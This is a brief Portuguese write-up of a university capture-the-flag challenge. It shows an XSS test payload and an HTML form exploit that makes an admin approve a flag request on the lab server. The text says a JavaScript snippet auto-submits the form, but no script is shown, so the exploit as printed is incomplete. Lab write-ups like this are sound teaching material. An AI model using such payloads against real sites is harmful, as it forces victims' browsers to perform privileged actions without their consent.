# CTF 6

## Context

O desafio envolve convencer o administrador de um servidor web na porta 5004 a fornecer a flag. O administrador irá analisar os pedidos na porta 5005, onde pode aprovar ou rejeitar as solicitações.

## Vulnerability Analysis

1. **Teste de XSS:**
   - Para garantir a segurança da aplicação, conduzimos testes de Cross-Site Scripting (XSS).
   - Utilizamos o payload `<script>alert(123)</script>` para verificar a presença de vulnerabilidades XSS.
   - Verificamos que o alerta é apresentado e encontramos a vulnerabilidade.

## Exploit

```
<form method="post" action="http://ctf-fsi.fe.up.pt:5005/request/4af3dfbaf29fbb307568a649a1ed66990aad5d7d/approve" target=_blank, role="form">
    <div class="submit">
        <input type="submit" id="giveflag" value="Give the flag">
    </div>
</form>
```
- O formulário está configurado para enviar uma solicitação POST para o URL fornecido.
- O script JavaScript automatiza o envio do formulário assim que a página é carregada.
- Isto significa que o admin vai carregar no giveflag, o que por sua vez nos dá acesso à mesma.
